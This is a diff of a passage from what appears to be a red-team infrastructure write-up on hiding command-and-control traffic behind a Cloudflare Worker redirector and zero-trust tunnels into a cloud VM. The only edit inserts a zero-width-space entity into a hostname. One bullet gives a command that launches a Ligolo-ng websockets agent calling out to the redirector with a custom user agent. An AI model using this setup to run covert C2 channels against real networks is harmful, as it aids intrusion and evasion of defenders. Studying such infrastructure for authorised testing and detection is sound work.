@@ -196,7 +196,7 @@ So, if you are still with me that is now all we need to access our cloud infrast
 
  - We update Cloudflare as I have shown to expect our custom header values.
  - We update Cloudflare to expect a custom IP should we want to grab files from a specific IP.
- - We can generate a C2\Ligolo agent with a custom header. Therefore, with the branched websockets version of Ligolo-ng as an example you can do the following:ligolosockets.exe -connect https://redirector.myname.workers.dev:443 -ua MY-LIGOLO
+ - We can generate a C2\Ligolo agent with a custom header. Therefore, with the branched websockets version of Ligolo-ng as an example you can do the following:ligolosockets.exe -connect https://redirector.myname.&#8203;workers.dev:443 -ua MY-LIGOLO
  - We send all of our requests to the Worker redirector URL and not to the tunnels directly as the Worker will add the zero trust header values required to enter the tunnels. Accessing them directly will no longer work except for the email login to our file server.
  - The worker passes the request to the app sitting in front of the tunnels which then checks for the service auth token to make sure it matches.
  - If the service auth token matches, the request is directed to that specific tunnel. This then flows into the internal URL of our Cloud VM (which is specified in the tunnel config) to provide us with our connectivity.
